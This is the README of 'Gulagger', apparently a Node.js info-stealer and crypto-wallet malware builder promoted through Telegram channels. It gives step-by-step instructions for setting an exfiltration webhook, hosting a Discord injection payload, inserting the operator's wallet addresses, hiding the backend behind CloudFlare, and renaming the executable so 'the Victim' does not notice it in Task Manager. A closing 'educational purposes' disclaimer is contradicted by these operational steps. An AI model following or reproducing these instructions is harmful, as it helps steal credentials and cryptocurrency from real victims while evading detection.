# [ 🔒 Gulagger Official Repository 🔒 ]

[![Discord](https://img.shields.io/discord/840168131652747264?color=9900ee&label=discord&style=flat-round)](https://t.me/GulaggerBOT)
![GitHub Lines](https://img.shields.io/tokei/lines/github/Gulag-Innovation/Gulagger?color=9900ee)
![GitHub Language](https://img.shields.io/github/languages/top/Gulag-Innovation/Gulagger?color=9900ee)
[![Build](https://img.shields.io/github/v/release/Gulag-Innovation/Gulagger)](https://github.com/Gulag-Innovation/Gulagger/releases/latest)
[![Downloads](https://img.shields.io/github/downloads/Gulag-Innovation/Gulagger/total?color=9900ee)](https://github.com/Gulag-Innovation/Gulagger/release/latest)
[![License](https://img.shields.io/github/license/Gulag-Innovation/Gulagger)](https://github.com/Gulag-Innovation/Gulagger/blob/master/LICENSE)

<p align="center">
    <img src="https://i.imgur.com/GNotjfd.png" alt="thegulag" />
</p>

<center>

## ============[ Official Telegram Channels ]===============

### [Gulagger Announcements][gulaggerannouncements]
### [Gulagger Vouches][gulaggervouches]
### [Gulagger Chat][gulaggerchat]
### [Gulagger Bot][gulaggerbot]
### [The Gulag Announcements][thegulag]
### [The Gulag Chat][thegulagchat]

## ===============================================

# ===========[ Getting Started ]============

**This In-Depth Guide Will Show You How To Properly Clone, Setup, Build, And Compile Gulagger.**

## ============[ Requirement/Dependencies ]===============

### [WebStorm][webstorm]
### [NodeJS 18.15.0][nodejs]
### [Chocolatey][chocolatey]
### [Node Version Manager (NVM)][nvm] Optional But <u>HIGHLY RECOMMENDED</u>

### **_[WebStorm][webstorm] Is Recommended!_**

## ============[ Building From Source Instructions ]============

### Make Sure To Follow Each Step EXACTLY!
1. Clone The Repo: `git clone https://github.com/Gulag-Innovation/Gulagger.git`
2. Enter The Project Directory: `cd Gulagger`
3. Open `Gulagger` In Your IDE
4. Do `Ctrl + Shift + R` To Do A Search & Replace
5. Replace `Your Webhook Here` With Your Webhook <u>(If You Do This Correctly, It'll Replace ALL Instances In The Project, Including The Files You Need To Upload In The `UploadThese` Folder)</u>
### - [DO NOT USE DISCORD TO HOST YOUR FILES, AS THEY ADDED/PLAN TO ADD 24 HOUR LINKS!][24hourlinks]
### <u>We Recommend Uploading Them To Somewhere Where You Can Set It To Private, Potentially [Pastebin][pastebin], Or Setup Your Own Web Server (Will Require Port Forwarding If  You Host It Locally.)</u>
### - [How To Setup A Web Server On Windows, Linux, And Mac & Port Forward][webserversetup]
### - [How To Setup CloudFlare Site Protection For Free][cloudflaresetup] (If You Have A Domain And Wish To Self-Host Altogether)
### - You'll Want Your DNS A Records To Look Like This To Prevent DNS A Leaks (Which Expose The Backend IP Behind CloudFlare)

<p align="center">
    <img src="https://i.imgur.com/jgwXRBM.png" alt="dnsexample" />
</p>

### - DO NOT USE [GITHUB][github] OR [REPLIT][replit] TO HOST YOUR FILES AS ANYONE CAN SEE YOUR CONFIG FILES, INCLUDING YOUR WEBHOOK
### - Delete The `UploadThis` Folder Once You've Uploaded The Files
6. Open `gulagger.js`
7. Edit `Lines 82-91` To Include Your Wallet Addresses 
8. Replace `Link To Your discord_injection.js` on `Line 103` With The Link To Your `discord_injection.js`
9. Replace `Link To Your ct0.txt` on `Line 1,440` With The Link To Your `ct0.txt`
10. Run `install.bat` To Install All The Dependencies 
11. Run `fix.bat` To Fix Possible Errors, And Dependencies Issues That May Happen When Building 
12. Run `build.bat` To Build & Compile Gulagger

13. <u>Make Sure To Rename The Compiled Executable, Or The Victim Will See</u> `Gulagger.exe` <u>In Their Task Manager</u> 

# ========[ Help/Information Center ]========

<center>

[Submit A Question](https://github.com/Gulag-Innovation/Gulagger/issues/new?assignees=&labels=question&template=question.md&title=)

[Submit A Suggestion](https://github.com/Gulag-Innovation/Gulagger/issues/new?assignees=&labels=suggestion&template=suggestion.md&title=)

[Report A Bug](https://github.com/Gulag-Innovation/Gulagger/issues/new?assignees=&labels=bug&template=bug-report.md&title=)

[Please Read Our Contribution Guidelines](https://github.com/Gulag-Innovation/Gulagger/blob/master/CONTRIBUTING.md)

</center>

# =============[ Credits ]=============

- Mr.Gibson
- Killet
- Phantom
- A Few Others Who Wish To Remain Nameless

[webstorm]: https://www.jetbrains.com/webstorm/download/
[nodejs]: https://nodejs.org/dist/v18.15.0/node-v18.15.0-x64.msi
[chocolatey]: https://chocolatey.org/install
[nvm]: https://www.freecodecamp.org/news/node-version-manager-nvm-install-guide/
[24hourlinks]: https://www.theverge.com/2023/11/4/23946640/discord-file-links-will-expire-after-a-day-to-fight-malware
[pastebin]: https://pastebin.com 
[webserversetup]: https://www.youtube.com/watch?v=gDnA7SJgXQc
[cloudflaresetup]: https://developers.cloudflare.com/fundamentals/setup/
[github]: https://github.com
[replit]: https://replit.com
[dnsexample]: https://i.imgur.com/jgwXRBM.png

[gulaggerannouncements]: https://t.me/GulaggerOfficial
[gulaggervouches]: https://t.me/GulaggerVouches
[gulaggerchat]: https://t.me/GulaggerChat
[gulaggerbot]: https://t.me/GulaggerBot
[thegulag]: https://t.me/TheGulagOfficial
[thegulagchat]: https://t.me/TheGulagOfficialChat

# ==========[ ⚖️ Legal Disclaimer ⚖️ ]==========

**Important Legal Notice: By proceeding, you expressly acknowledge and accept the terms of the following disclaimer:**

## 📢 Attention

**This project is governed by The GNU General Public License (GPL). You have the freedom to download, modify, and share this code under the conditions specified in the GPL. Any attempt to use this code for malicious purposes is vehemently discouraged, and legal consequences may ensue if caught by authorities.**

### 🚨 Non-Misuse Clause

The developers hereby disclaim any responsibility for the misuse of this code. It is provided exclusively for educational purposes. Users are emphatically advised against attempting to execute, alter, or distribute this code with malicious intent.

## 🚀 Educational Purpose

The primary objective in disseminating this code is for educational purposes, shedding light on malicious programming & software practices, tactics, etc. Users are strongly encouraged to engage with this material ethically and lawfully.

**⚠️ Use this code responsibly and strictly in accordance with the terms of the GNU General Public License! ⚠️**

### 🚀 Risk Acknowledgment

This project is presented as an uncurtailed creation, offered on an "as is" basis. Without warranties or assurances, it represents a distinctive experience where users are in absolute control. Adherence to the regulations of both digital and tangible realms is imperative. Developers assert immunity from liability for any potential damages or losses arising from engagement, modification, or distribution of this avant-garde creation.

**<u>By deploying this software, users are not merely executing code; they are potentially engaging in activities that may constitute various legal violations, contravening multiple statutes, regulations, and laws.**</u>

</center>
